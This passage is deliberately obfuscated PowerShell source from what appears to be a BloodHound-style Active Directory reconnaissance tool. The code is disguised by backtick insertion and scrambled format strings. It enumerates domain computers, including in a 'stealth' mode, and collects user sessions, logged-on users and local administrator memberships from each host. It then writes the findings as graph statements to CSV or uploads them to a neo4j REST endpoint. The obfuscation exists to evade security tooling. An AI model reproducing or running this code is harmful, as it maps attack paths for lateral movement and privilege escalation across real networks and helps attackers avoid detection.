                                ${N`ULL} = ${staTEME`N`TS}.("{0}{1}"-f 'A','dd').Invoke( @{("{2}{0}{1}" -f 'e','nt','statem')="MERGE (group:Group { name: UPPER('$AccountName') }) MERGE (computer:Computer { name: UPPER('$Computer') }) MERGE (group)-[:AdminTo]->(computer)" } )
                            }
                        }
                        else {
                            if (${PSC`mDl`eT}.PaRaMEtERSeTName -eq ("{1}{0}{2}" -f 'E','CSV','xport')) {
                                ${locA`lAdm`i`NwrIT`er}.("{2}{0}{1}"-f'iteLin','e','Wr').Invoke("`"$Computer`",`"$AccountName`",`"user`"")
                            }
                            else {
                                ${nU`lL} = ${St`AtEM`EnTS}.("{1}{0}"-f 'd','Ad').Invoke( @{("{2}{1}{0}"-f 'nt','ateme','st')="MERGE (user:User { name: UPPER('$AccountName') }) MERGE (computer:Computer { name: UPPER('$Computer') }) MERGE (user)-[:AdminTo]->(computer)" } )
                            }
                        }
                    }
                }
                &("{4}{1}{3}{0}{2}" -f'Verbo','rite','se','-','W') ('D'+'one '+'en'+'u'+'mer'+'ating '+'GPO'+' '+'lo'+'c'+'al '+'grou'+'p'+' '+'m'+'embersh'+'ips '+'for'+' '+'do'+'main '+"$TargetDomain")
            }
            &("{3}{0}{2}{1}"-f 'rite-','ose','Verb','W') ("{2}{0}{4}{5}{1}{3}{6}"-f'n','ating ','Do','GPO local gr','e enume','r','oup')
            
        }

        
        ${Cu`R`ReNTUS`ER} = ( ${8`39}::"us`ErN`AME").("{0}{1}"-f 'toLo','wer').Invoke()

        
        ${hOSt`EN`UMbLoCk} = {
            Param(${c`oM`pUTERna`Me}, ${cuR`RE`NtUSeR2}, ${uSel`Oc`ALG`R`oUp2}, ${Us`Es`essi`ON2}, ${uSe`lo`ggeD`oN2}, ${d`oMA`insI`d2})

            ForEach (${Tar`gEtC`o`mPUtEr} in ${C`o`MPUTErN`AME}) {
                ${U`P} = &("{0}{2}{4}{1}{3}"-f'Test','ec','-','tion','Conn') -Count 1 -Quiet -ComputerName ${ta`RG`etcOmPUtEr}
                if(${u`p}) {
                    if(${uSel`OcaLgRO`U`P2}) {
                        
                        ${ReSu`l`Ts} = &("{2}{0}{3}{1}" -f 'et','etLocalGroup','G','-N') -ComputerName ${TArgEtcom`PuT`ER} -API -IsDomain -DomainSID ${do`m`AINsid2}
                        if(${r`esults}) {
                            ${R`es`UltS}
                        }
                        else {
                            &("{2}{4}{0}{1}{3}"-f'r','ou','Get-N','p','etLocalG') -ComputerName ${t`ArG`ETC`OmPuteR} -IsDomain -DomainSID ${doM`A`I`NsID2}
                        }
                    }

                    ${IpaDd`R`e`Ss} = @(&("{1}{2}{0}" -f 'ddress','Get-IP','A') -ComputerName ${t`ARGE`Tcomp`UTeR})[0]."I`pA`DDreSs"

                    if(${Uses`E`SSI`ON2}) {
                        ForEach (${SE`SS`iOn} in $(&("{1}{3}{4}{0}{2}" -f'NetSessi','G','on','e','t-') -ComputerName ${TaRgE`TCOM`P`U`TEr})) {
                            ${USe`RNaMe} = ${sES`SI`on}."S`esI10_U`s`E`RNAmE"
                            ${c`N`AmE} = ${sES`S`iOn}."S`esI`10`_CNamE"

                            if(${c`N`AME} -and ${CNA`mE}.("{1}{0}{2}" -f'ar','St','tsWith').Invoke("\\")) {
                                ${Cn`A`me} = ${C`N`AmE}.("{1}{0}{2}" -f'a','TrimSt','rt').Invoke("\")
                            }

                            
                            if ((${u`se`Rna`ME}) -and (${USern`A`ME}.("{0}{1}"-f't','rim').Invoke() -ne '') -and (${U`serna`me} -notmatch '\$') -and (${U`Se`RNaMe} -notmatch ${c`URRe`Nt`U`sER2})) {
                                
                                try {
                                    ${CNAmeDnS`N`A`me} =  ( &("{2}{1}{0}" -f 'e','eT-vARiaBl','g') ("1"+"4f2b")  -vAlU )::("{1}{2}{0}"-f'ry','GetHo','stEnt').Invoke(${cn`AmE}) | &("{2}{4}{1}{0}{3}" -f 'bjec','t-O','Sel','t','ec') -ExpandProperty ("{1}{0}{2}"-f't','Hos','Name')
                                }
                                catch {
                                    ${CNam`Ed`NSNAmE} = ${c`N`AME}
                                }
                                @{
                                    ("{1}{0}{2}"-f 'serDoma','U','in') = ${n`ULl}
                                    ("{1}{0}{2}"-f'Nam','User','e') = ${Us`ERn`AMe}
                                    ("{0}{1}{2}"-f 'Comput','e','rName') = ${tARg`eTCoMpU`T`eR}
                                    ("{1}{2}{0}"-f 'ress','I','PAdd') = ${iPAD`D`REsS}
                                    ("{3}{0}{1}{2}" -f'essi','onFr','om','S') = ${c`N`AME}
                                    ("{0}{3}{2}{1}" -f'Sess','Name','om','ionFr') = ${CN`Am`ed`NSN`AME}
                                    ("{2}{0}{1}" -f 'ocalA','dmin','L') = ${n`Ull}
                                    ("{1}{0}"-f 'ype','T') = ("{1}{0}{2}"-f 's','U','erSession')
                                }
                            }
                        }
                    }

                    if(${USeloGG`Ed`oN2}) {
                        ForEach (${u`seR} in $(&("{1}{0}{2}"-f 'et-','G','NetLoggedon') -ComputerName ${TA`R`geT`C`OMpUTeR})) {
                            ${Use`RN`Ame} = ${US`ER}."wKu`i1`_userN`AME"
                            ${u`seRDOM`Ain} = ${US`er}."wKUI1`_lo`GO`N`_do`MaIn"

                            
                            if(${tAR`GeT`c`OmPU`TEr} -notmatch "^$UserDomain") {
                                if ((${USeR`NA`ME}) -and (${USern`A`ME}.("{0}{1}" -f 'tri','m').Invoke() -ne '') -and (${Use`RN`AME} -notmatch '\$')) {
                                    @{
                                        ("{1}{2}{0}" -f 'omain','Us','erD') = ${Us`ERDoMa`in}
                                        ("{0}{2}{1}" -f'Us','rName','e') = ${us`E`RnAME}
                                        ("{1}{0}{2}" -f 'uterNa','Comp','me') = ${T`Arge`TcOm`P`UTER}
                                        ("{2}{1}{0}"-f 'dress','Ad','IP') = ${IPa`Ddr`ess}
                                        ("{1}{2}{0}" -f'onFrom','Se','ssi') = ${nu`lL}
                                        ("{1}{3}{0}{2}"-f'FromN','Sessio','ame','n') = ${nu`Ll}
                                        ("{1}{2}{0}"-f'in','Local','Adm') = ${nu`lL}
                                        ("{1}{0}" -f'e','Typ') = ("{2}{0}{1}"-f 'er','Session','Us')
                                    }
                                }
                            }
                        }

                        ForEach (${Us`Er} in $(&("{3}{2}{1}{0}" -f'Local','dOn','ge','Get-Log') -ComputerName ${TArge`T`Co`MPuTEr})) {
                            ${Us`E`RnAMe} = ${us`er}."usER`Name"
                            ${U`Se`RdoMAIN} = ${Us`ER}."U`SERDo`MAIN"

                            
                            if(${tARge`TcoMp`U`TEr} -notmatch "^$UserDomain") {
                                @{
                                    ("{0}{2}{1}"-f 'U','erDomain','s') = ${uSe`R`doma`iN}
                                    ("{0}{1}{2}" -f'U','ser','Name') = ${U`sER`Na`Me}
                                    ("{0}{2}{1}"-f'Comp','e','uterNam') = ${T`ARGe`TC`OMpUT`Er}
                                    ("{0}{1}{2}" -f 'IPAd','dr','ess') = ${I`P`AdDr`ESs}
                                    ("{1}{2}{0}"-f'rom','Sessi','onF') = ${Nu`LL}
                                    ("{2}{1}{0}" -f'Name','ionFrom','Sess') = ${nU`LL}
                                    ("{0}{1}{2}{3}" -f 'Loca','l','Ad','min') = ${NU`lL}
                                    ("{0}{1}"-f 'T','ype') = ("{1}{2}{0}"-f'n','UserSess','io')
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        if (${targ`ETD`o`Ma`INS} -and (-not ${SKIPc`o`MPUterENumeRAt`i`ON})) {
            
            if(${stat`EmE`NtS}) {
                ${St`A`T`EMenTS}.("{1}{0}"-f'ar','Cle').Invoke()
            }
            [Array]${Tar`gEt`Co`Mpu`TErs} = @()

            ForEach (${TA`RgEtDoM`AiN} in ${TArG`ETdOM`AI`Ns}) {

                ${DOM`Ai`NSID} = &("{2}{1}{0}"-f'DomainSid','et-','G') -Domain ${Ta`RG`etDOmAiN}

                ${sCriP`TpA`R`AmeT`E`RS} = @{
                    ("{3}{1}{2}{0}"-f '2','rrentUse','r','Cu') = ${CUrRe`Nt`USER}
                    ("{2}{0}{4}{1}{3}"-f 'eLocal','u','Us','p2','Gro') = ${U`sEloCa`l`GrOuP}
                    ("{2}{3}{0}{1}" -f'eSessi','on2','U','s') = ${Us`ESesSI`On}
                    ("{2}{1}{3}{0}" -f 'don2','g','UseLo','ge') = ${USELo`gg`edOn}
                    ("{0}{2}{1}" -f 'D','ainSID2','om') = ${dOm`Ain`Sid}
                }

                if(${cOLlecti`on`meth`od} -eq ("{0}{2}{1}"-f'Ste','th','al')) {
                    &("{0}{2}{3}{1}" -f 'W','e','rite','-Verbos') ('Execu'+'ting'+' '+'steal'+'t'+'h '+'c'+'omput'+'er '+'enu'+'me'+'r'+'ation '+'of'+' '+'d'+'omain'+' '+"$TargetDomain")

                    &("{3}{2}{1}{0}" -f 'se','bo','e-Ver','Writ') ('Qu'+'eryin'+'g '+'dom'+'a'+'in '+"$TargetDomain "+'for'+' '+'File'+' '+'Serve'+'rs')
                    ${t`ARgeT`C`OM`PutErs} += &("{1}{4}{2}{3}{0}" -f 'eServer','G','-Ne','tFil','et') -Domain ${TA`R`Get`DomaIN} -DomainController ${DOmA`iN`C`ONTrOlLEr}

                    &("{4}{3}{0}{1}{2}"-f't','e-Verbos','e','ri','W') ('Queryi'+'ng '+'dom'+'a'+'in '+"$TargetDomain "+'for'+' '+'DF'+'S '+'Serv'+'er'+'s')
                    ${TA`RgE`TCOM`pu`TeRS} += ForEach(${DFS`s`eRV`Er} in $(&("{2}{1}{0}{3}"-f 'sha','-DFS','Get','re') -Domain ${tArgeTdo`M`A`iN} -DomainController ${dO`M`Ain`COntRol`LER})) {
                        ${dFs`Se`Rver}."R`Emot`E`seRVErna`ME"
                    }

                    &("{0}{1}{4}{3}{2}"-f 'Wr','ite','rbose','Ve','-') ('Query'+'ing'+' '+'do'+'ma'+'in '+"$TargetDomain "+'for'+' '+'Do'+'main '+'Cont'+'r'+'ollers')
                    ${TaRGET`cO`MpU`TERS} += ForEach(${DO`mAincoNTROl`L`ER} in $(&("{5}{1}{3}{2}{6}{0}{4}" -f'olle','-NetDom','Co','ain','r','Get','ntr') -LDAP -DomainController ${D`Om`AincOntR`OlLeR} -Domain ${ta`R`GeTDom`AIN})) {
                        ${DoMA`INC`ONtRoL`Ler}."Dns`HoStNA`mE"
                    }

                    ${TA`R`geT`ComPu`TErs} = ${TaRg`et`cO`mpUT`eRs} | &("{3}{0}{2}{1}"-f're-Ob','ect','j','Whe') {${_} -and (${_}.("{1}{0}"-f'm','Tri').Invoke() -ne '')} | &("{2}{1}{0}{3}"-f'rt-Ob','o','S','ject') -Unique
                }
                else {
                    if(${c`ompuTe`R`NaME}) {
                        &("{2}{1}{0}{3}"-f 'te-V','ri','W','erbose') ("{1}{3}{2}{6}{0}{4}{5}{7}{8}" -f'ied -Comput','U','eci','sing sp','erN','ame','f',' t','arget set')
                        if(${cO`mp`Ut`ERNaME} -isnot [System.Array]) {${ComPU`T`ER`NAME} = @(${coM`PU`TeRna`mE})}
                        ${TARg`ETCo`MP`UT`Ers} = ${compUtE`R`Na`Me}
                    }
                    else {
                        &("{1}{2}{0}" -f 'bose','Write-','Ver') ('Enu'+'m'+'erati'+'ng '+'a'+'ll '+'mach'+'ines'+' '+'in'+' '+'d'+'omain '+"$TargetDomain")
                        ${COm`PuTER`sE`AR`cH`er} = &("{1}{5}{3}{0}{4}{2}" -f 'Se','Get-D','cher','n','ar','omai') -Domain ${T`ARGet`D`oMain} -DomainController ${domaiNC`ON`TROLL`er} -ADSPath ${co`M`pu`T`ErAdSPAtH}
                        ${CO`MpUt`e`RSEAR`cher}."F`ILtEr" = ("{2}{0}{1}{3}{4}" -f 'A','MAccountType=80','(s','530','6369)')
                        ${Nu`LL} = ${CO`mPute`RsEAr`C`Her}."propER`TieS`T`O`loAD".("{0}{1}"-f 'Ad','d').Invoke(("{3}{0}{2}{1}" -f'ns','ostname','h','d'))
                        ${T`A`R`GET`CoMPuTERS} = ${c`o`MpUtersear`c`HeR}.("{0}{2}{1}" -f 'Fin','l','dAl').Invoke() | &("{2}{1}{3}{0}"-f 'ject','-','ForEach','Ob') {${_}."PRO`pERTI`ES"."DNSho`stN`A`me"}
                        ${CO`MP`UTErs`E`AR`chER}.("{1}{0}" -f 'ispose','D').Invoke()
                    }
                }
                ${TARg`et`COmp`UtERs} = ${tA`Rg`ETCO`mPU`TeRs} | &("{2}{0}{1}" -f'Ob','ject','Where-') { ${_} }

                &("{4}{2}{3}{0}{1}"-f 'Functio','n','d','ed','New-Threa') -ComputerName ${Ta`Rg`etCoMp`UTerS} -ScriptBlock ${HOsT`en`UMBL`O`cK} -ScriptParameters ${s`CRiP`TPARA`mEtE`Rs} -Threads ${tHR`e`Ads} | &("{1}{3}{4}{2}{0}" -f 'bject','F','-O','o','rEach') {
                    if(${_}[("{1}{0}" -f'pe','Ty')] -eq ("{1}{2}{0}"-f'n','User','Sessio')) {
                        if(${_}[("{0}{3}{1}{2}" -f'S','onFrom','Name','essi')]) {
                            try {
                                ${Ses`sionfr`oMnAME} = ${_}[("{2}{1}{0}{3}" -f'mN','o','SessionFr','ame')]
                                ${uS`er`NA`mE} = ${_}[("{1}{0}{2}" -f'se','U','rName')].("{0}{1}"-f'ToUpp','er').Invoke()
                                ${coMP`UTeRd`O`maIN} = ${_}[("{0}{2}{3}{1}" -f'S','FromName','es','sion')]."S`UbStR`ING"(${_}[("{3}{2}{1}{0}" -f'me','mNa','ro','SessionF')].("{1}{0}{2}" -f'e','Ind','xOf').Invoke('.')+1).("{0}{2}{1}" -f 'To','r','Uppe').Invoke()

                                if(${U`seRD`o`mai`NmaPpingS}) {
                                    ${Us`e`RDoM`AIN} = ${Nu`LL}
                                    if(${USERdoMAinMaP`P`I`N`gS}[${Us`erN`AME}]) {
                                        if(${UsErdo`M`AiNm`AppiNgs}[${uSE`RNa`me}]."cO`UNt" -eq 1) {
                                            ${U`serDo`m`AiN} = ${us`eRd`O`M`AINMaPp`I`Ngs}[${US`Er`Name}]
                                            ${LO`g`gE`do`NuSeR} = "$UserName@$UserDomain"
                                            if (${PSCmDL`eT}.PaRameTerSeTNAme -eq ("{1}{3}{2}{0}"-f'ort','C','xp','SVE')) {
                                                ${S`EsSIONWR`iteR}.("{3}{2}{0}{1}"-f'n','e','teLi','Wri').Invoke("`"$SessionFromName`",`"$LoggedOnUser`",`"1`"")
                                            }
                                            else {
                                                ${n`UlL} = ${sta`TEM`e`Nts}.("{0}{1}" -f 'A','dd').Invoke( @{("{1}{0}{2}"-f 'me','state','nt')="MERGE (user:User { name: UPPER('$LoggedOnUser') }) MERGE (computer:Computer { name: UPPER('$SessionFromName') }) MERGE (computer)-[:HasSession {Weight: '1'}]->(user)" } )
                                            }
                                        }
                                        else {
                                            ${COM`pUt`erdO`ma`In} = ${_}[("{0}{3}{4}{1}{2}" -f 'Se','mN','ame','ssio','nFro')]."sUbstR`INg"(${_}[("{4}{0}{2}{1}{3}"-f 'si','F','on','romName','Ses')].("{0}{1}" -f'IndexO','f').Invoke('.')+1).("{0}{1}{2}" -f 'T','oUppe','r').Invoke()

                                            ${UsErD`OM`A`iNMA`PPI`NGS}[${USer`N`A`mE}] | &("{2}{1}{0}{3}"-f'ch-Ob','a','ForE','ject') {
                                                
                                                if(${_} -eq ${C`oM`putERdO`MAIn}) {
                                                    ${u`sERdO`MaIN} = ${_}
                                                    ${logGeDo`N`UsEr} = "$UserName@$UserDomain"
                                                    if (${PS`cmdL`eT}.PArAMEterSETNAmE -eq ("{1}{0}{2}"-f 'xpo','CSVE','rt')) {
                                                        ${s`EssION`WRIt`eR}.("{0}{2}{1}"-f'WriteL','ne','i').Invoke("`"$SessionFromName`",`"$LoggedOnUser`",`"1`"")
                                                    }
                                                    else {
                                                        ${N`ULL} = ${st`AtE`me`Nts}.("{1}{0}" -f'dd','A').Invoke( @{("{2}{0}{1}" -f 'tat','ement','s')="MERGE (user:User { name: UPPER('$LoggedOnUser') }) MERGE (computer:Computer { name: UPPER('$SessionFromName') }) MERGE (computer)-[:HasSession {Weight: '1'}]->(user)" } )
                                                    }
                                                }
                                                
                                                else {
                                                    ${USe`RDom`AiN} = ${_}
                                                    ${Lo`GG`EDo`Nuser} = "$UserName@$UserDomain"
                                                    if (${p`ScMdl`et}.ParAMEteRSetname -eq ("{1}{0}{2}" -f'Exp','CSV','ort')) {
                                                        ${s`ES`sIoNW`RiT`er}.("{0}{2}{1}" -f 'Wr','ne','iteLi').Invoke("`"$SessionFromName`",`"$LoggedOnUser`",`"2`"")
                                                    }
                                                    else {
                                                        ${N`Ull} = ${STAT`e`MeNTS}.("{0}{1}"-f'Ad','d').Invoke( @{("{1}{0}{2}" -f 'tatem','s','ent')="MERGE (user:User { name: UPPER('$LoggedOnUser') }) MERGE (computer:Computer { name: UPPER('$SessionFromName') }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)" } )
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    else {
                                        
                                        ${loGgE`d`onUser} = "$UserName@UNKNOWN"
                                        if (${Ps`Cm`dLeT}.ParAmeTERSEtName -eq ("{0}{2}{1}{3}" -f'CSVE','r','xpo','t')) {
                                            ${SE`SsIoN`WrIT`eR}.("{1}{2}{0}" -f 'eLine','Wr','it').Invoke("`"$SessionFromName`",`"$LoggedOnUser`",`"2`"")
                                        }
                                        else {
                                            ${n`ULL} = ${s`T`AtE`ments}.("{1}{0}"-f 'd','Ad').Invoke( @{("{0}{1}" -f'statem','ent')="MERGE (user:User { name: UPPER('$LoggedOnUser') }) MERGE (computer:Computer { name: UPPER('$SessionFromName') }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)" } )
                                        }
                                    }
                                }
                                else {
                                    
                                    ${loggEdon`U`SER} = "$UserName@$ComputerDomain"
                                    if (${p`sC`mDlet}.pArAMEterSetNAme -eq ("{0}{2}{1}" -f'C','VExport','S')) {
                                        ${sE`sS`i`O`NWRITeR}.("{0}{2}{1}{3}"-f 'Wr','teLi','i','ne').Invoke("`"$SessionFromName`",`"$LoggedOnUser`",`"2`"")
                                    }
                                    else {
                                        ${N`UlL} = ${StatE`me`Nts}.("{0}{1}"-f'A','dd').Invoke( @{("{0}{1}{2}{3}" -f 's','t','at','ement')="MERGE (user:User { name: UPPER('$LoggedOnUser') }) MERGE (computer:Computer { name: UPPER('$SessionFromName') }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)"} )
                                    }
                                }
                            }
                            catch {
                                &("{2}{3}{1}{0}{4}" -f 'ni','r','Wri','te-Wa','ng') ('Err'+'o'+'r '+'e'+'xtra'+'ct'+'ing '+'d'+'omain '+'fr'+'om '+"$SessionFromName")
                            }
                        }
                        elseif(${_}[("{1}{2}{0}" -f 'nFrom','Sessi','o')]) {
                            ${SEs`S`I`onFrom`NaMe} = ${_}[("{3}{1}{2}{0}"-f'om','nF','r','Sessio')]
                            ${L`oggED`oNUs`Er} = "$($_['UserName'])@UNKNOWN"
                            if (${P`s`cmDLEt}.pARAMETeRSetname -eq ("{0}{2}{1}"-f'CSVE','t','xpor')) {
                                ${s`E`ssioNWRiTEr}.("{2}{1}{0}" -f 'ine','riteL','W').Invoke("`"$SessionFromName`",`"$LoggedOnUser`",`"2`"")
                            }
                            else {
                                ${nU`Ll} = ${StA`Tem`en`TS}.("{1}{0}" -f 'd','Ad').Invoke( @{("{0}{2}{1}"-f's','t','tatemen')="MERGE (user:User { name: UPPER(`"$LoggedOnUser`") }) MERGE (computer:Computer { name: UPPER(`"$SessionFromName`") }) MERGE (computer)-[:HasSession {Weight: '2'}]->(user)"} )
                            }
                        }
                        else {
                            
                            ${Use`RdO`MaiN} = ${_}[("{2}{1}{0}" -f 'omain','serD','U')]
                            ${uSE`Rn`AME} = ${_}[("{2}{0}{1}"-f 'serNam','e','U')]
                            try {
                                if(${dom`AinshoRtn`AmeMAp`Pi`NGs}[${uSE`Rd`oMAin}]) {
                                    
                                    ${a`ccoU`N`TNAmE} = "$UserName@$($DomainShortnameMappings[$UserDomain])"
                                }
                                else {
                                    ${Mem`BErsIMple`N`Ame} = "$UserDomain\$UserName" | &("{2}{0}{3}{1}"-f 'rt-','e','Conve','ADNam') -InputType 'NT4' -OutputType ("{2}{0}{1}" -f 'nic','al','Cano')

                                    if(${MEM`BeRSiM`PlEn`AmE}) {
                                        ${MEMb`eR`D`OMA`in} = ${MeMbERs`i`mPLen`Ame}.("{0}{1}" -f 'Spl','it').Invoke('/')[0]
                                        ${AC`C`ountnAmE} = "$UserName@$MemberDomain"
                                        ${dOM`AINSH`o`RtnamemappIN`Gs}[${u`s`e`RdomAin}] = ${ME`M`BeRd`omAIN}
                                    }
                                    else {
                                        ${a`C`c`OUnTNaME} = "$UserName@UNKNOWN"
                                    }
                                }

                                ${sEsSi`On`FromnA`mE} = ${_}[("{2}{0}{1}{3}" -f'ter','Nam','Compu','e')]

                                if (${Psc`M`DleT}.PArameteRsEtnAmE -eq ("{1}{0}{2}" -f 'xpo','CSVE','rt')) {
                                    ${sess`i`ONwriter}.("{1}{0}{2}{3}" -f'ite','Wr','Lin','e').Invoke("`"$SessionFromName`",`"$AccountName`",`"1`"")
                                }
                                else {
                                    ${n`UlL} = ${St`AtE`mENts}.("{0}{1}" -f 'Ad','d').Invoke( @{("{1}{2}{0}" -f'ent','stat','em')="MERGE (user:User { name: UPPER('$AccountName') }) MERGE (computer:Computer { name: UPPER('$SessionFromName') }) MERGE (computer)-[:HasSession {Weight: '1'}]->(user)" } )
                                }
                            }
                            catch {
                                &("{0}{1}{2}" -f'Writ','e','-Verbose') ('Erro'+'r '+'con'+'vert'+'i'+'ng '+"$UserDomain\$UserName "+': '+"$_")
                            }
                        }
                    }
                    elseif(${_}[("{0}{1}"-f'Typ','e')] -eq ("{2}{1}{0}" -f 'User','ocal','L')) {
                        ${paR`TS} = ${_}[("{1}{2}{0}{3}"-f 'untN','Acc','o','ame')].("{1}{0}" -f'plit','s').Invoke('\')
                        ${U`sERdO`mAin} = ${Pa`RtS}[0]
                        ${UsE`RN`Ame} = ${pa`R`TS}[-1]

                        if(${D`Omain`shO`RTNaMe`MA`pPI`N`gS}[${u`s`er`DOmain}]) {
                            
                            ${acC`oUNT`N`AmE} = "$UserName@$($DomainShortnameMappings[$UserDomain])"
                        }
                        else {
                            ${mE`MBErS`Im`pL`EnamE} = "$UserDomain\$UserName" | &("{1}{0}{2}"-f 'N','Convert-AD','ame') -InputType 'NT4' -OutputType ("{0}{1}{2}"-f 'Ca','no','nical')

                            if(${MEmB`Er`SIm`PlEnAMe}) {
                                ${ME`mB`E`RdOM`AIn} = ${M`e`M`BeRsim`pLENA`Me}.("{0}{1}"-f 'Spl','it').Invoke('/')[0]
                                ${acc`ouNTNa`ME} = "$UserName@$MemberDomain"
                                ${D`om`AiNSho`RtnAmeM`A`ppIngS}[${uSE`Rdo`MAin}] = ${MEm`BeRdo`mAin}
                            }
                            else {
                                ${ACCoU`N`TNA`Me} = "$UserName@UNKNOWN"
                            }
                        }

                        ${C`OMputeRnA`Me} = ${_}[("{0}{1}{2}" -f 'Co','mputerN','ame')]
                        if(${_}[("{2}{0}{1}" -f 'Gro','up','Is')]) {
                            if (${Ps`Cmdl`Et}.paraMETERsetnAME -eq ("{0}{1}{2}"-f 'CSV','E','xport')) {
                                ${LOca`LAdm`InW`RiT`ER}.("{3}{1}{0}{2}" -f'iteL','r','ine','W').Invoke("`"$ComputerName`",`"$AccountName`",`"group`"")
                            }
                            else {
                                ${nU`lL} = ${StAtE`m`En`Ts}.("{1}{0}"-f'dd','A').Invoke( @{ ("{2}{0}{1}" -f'a','tement','st')="MERGE (group:Group { name: UPPER('$AccountName') }) MERGE (computer:Computer { name: UPPER('$ComputerName') }) MERGE (group)-[:AdminTo]->(computer)" } )
                            }
                        }
                        else {
                            if (${p`scMDlEt}.ParaMEtersetnAme -eq ("{1}{0}{2}"-f 'Expor','CSV','t')) {
                                ${lo`C`AlADMIN`wriTER}.("{0}{1}{2}"-f'Wr','iteLi','ne').Invoke("`"$ComputerName`",`"$AccountName`",`"user`"")
                            }
                            else {
                                ${n`UlL} = ${S`TatE`MentS}.("{0}{1}"-f 'A','dd').Invoke( @{("{3}{2}{0}{1}"-f 'teme','nt','a','st')="MERGE (user:User { name: UPPER('$AccountName') }) MERGE (computer:Computer { name: UPPER('$ComputerName') }) MERGE (user)-[:AdminTo]->(computer)" } )
                            }
                        }
                    }

                    if ((${PS`Cmd`let}.ParaMeTERSeTName -eq ("{0}{2}{1}" -f'RES','PI','TA')) -and (${STaT`E`m`eNTs}."Co`UnT" -ge ${thr`OTTle})) {
                        ${JS`On} = @{ ("{2}{0}{1}" -f 'atem','ents','st')=[System.Collections.Hashtable[]]${s`TAt`eMenTS} }
                        ${JsoNR`eqU`eST} = &("{2}{3}{1}{0}" -f'on20','Js','Con','vertTo-') ${J`soN}
                        ${NU`lL} = ${we`BcLi`enT}.("{0}{1}{2}{3}"-f'Uplo','a','d','String').Invoke(${u`Ri}."aBSO`L`UtEurI" + ("{0}{7}{5}{1}{2}{6}{4}{3}"-f 'db/','sac','t','it','omm','ata/tran','ion/c','d'), ${J`S`o`NrEquEST})
                        ${S`Ta`TEmE`NTs}.("{0}{1}"-f 'Clea','r').Invoke()
                         ${q`cf0z6}::("{0}{2}{1}"-f'C','ect','oll').Invoke()
                    }
                }
            }
        }
    }

    END {

        if (${P`sCmD`lEt}.PAraMeteRSEtNaME -eq ("{0}{2}{1}"-f 'CS','t','VExpor')) {
            if(${seSsionwR`It`eR}) {
                ${s`Es`sioNWrIT`Er}.("{0}{1}{2}" -f 'Di','spos','e').Invoke()
                ${s`E`SSI`oN`FILEstReAM}.("{1}{0}{2}" -f 'o','Disp','se').Invoke()
            }
            if(${gR`OUPWr`iT`Er}) {
                ${gR`OU`p`wRiTER}.("{1}{0}"-f 'spose','Di').Invoke()
                ${GROuP`F`IL`EsTr`EAm}.("{2}{1}{0}"-f'pose','is','D').Invoke()
            }
            if(${ACL`WRIt`eR}) {
                ${A`cL`WrIteR}.("{1}{0}" -f'ispose','D').Invoke()
                ${A`clfIL`Estr`Eam}.("{0}{1}" -f'Di','spose').Invoke()
            }
            if(${lo`caL`Ad`minwriTEr}) {
                ${loC`AlAd`mI`NWr`iT`eR}.("{2}{1}{0}" -f'se','o','Disp').Invoke()
                ${Lo`C`Al`AD`MiNFIlesTre`Am}.("{1}{0}" -f 'ispose','D').Invoke()
            }
            if(${T`R`Us`TWRITER}) {
                ${tru`s`T`WriTEr}.("{2}{0}{1}" -f'sp','ose','Di').Invoke()
                ${TRUs`TS`Fil`eS`Tr`eam}.("{0}{2}{1}"-f 'Dis','e','pos').Invoke()
            }

            &("{1}{2}{0}" -f 'utput','Write-','O') ('D'+'one '+'wri'+'tin'+'g '+'outp'+'ut '+'t'+'o '+'CSVs'+' '+'in:'+' '+"$OutputFolder\$CSVExportPrefix")
        }
        else {
           ${J`Son} = @{ ("{1}{0}{2}{3}" -f't','sta','e','ments')=[System.Collections.Hashtable[]]${sT`AtEM`eNtS} }
           ${jsOn`RE`qU`esT} = &("{1}{0}{3}{2}"-f 'nvertTo','Co','Json20','-') ${Js`On}
           ${n`Ull} = ${wE`BC`lIeNT}.("{0}{1}{2}"-f'Upl','oa','dString').Invoke(${u`Ri}."a`B`Sol`UTeURi" + ("{2}{4}{3}{1}{0}"-f'mit','ansaction/com','d','r','b/data/t'), ${JS`ONRE`queST})
           ${STatEm`E`N`TS}.("{0}{1}" -f'Cl','ear').Invoke()
           &("{2}{1}{0}"-f 'ut','ite-Outp','Wr') "Done sending output to neo4j RESTful API interface at: $($URI.AbsoluteUri) "
        }

          (  &("{0}{2}{1}"-f 'VARia','E','bL')  Qcf0Z6 -VAlUEOnL )::("{1}{0}"-f'llect','Co').Invoke()
    }
}











${M`Od} = &("{5}{0}{4}{1}{2}{3}"-f'-','nMe','mo','ryModule','I','New') -ModuleName ("{1}{0}" -f'32','Win')


${fuNcTIoNDE`FiN`I`Tio`Ns} = @(
    (&("{0}{1}" -f'fun','c') ("{0}{1}{2}"-f 'ne','t','api32') ("{1}{3}{0}{2}{4}" -f'er','N','Enu','etWkstaUs','m') ([Int]) @([String], [Int],   ${J8l`9Yc}.("{0}{2}{3}{1}" -f 'MakeByRefT','e','y','p').Invoke(), [Int],   ( &("{0}{1}{2}" -f 'VarIA','bl','e')  r7isGB )."V`ALue".("{2}{1}{0}{3}" -f 'e','ByR','Make','fType').Invoke(),  ( &("{1}{0}" -f'ir','d') ("va"+"rIABlE:"+"R7"+"isGB")  )."V`AluE".("{2}{1}{4}{0}{3}"-f 'fTy','R','MakeBy','pe','e').Invoke(),  (&("{1}{2}{0}" -f'e','VaRiAB','L')  ('R7'+'ISGB')  -ValueOnLY  ).("{3}{2}{1}{4}{0}" -f'ype','eByRe','ak','M','fT').Invoke())),
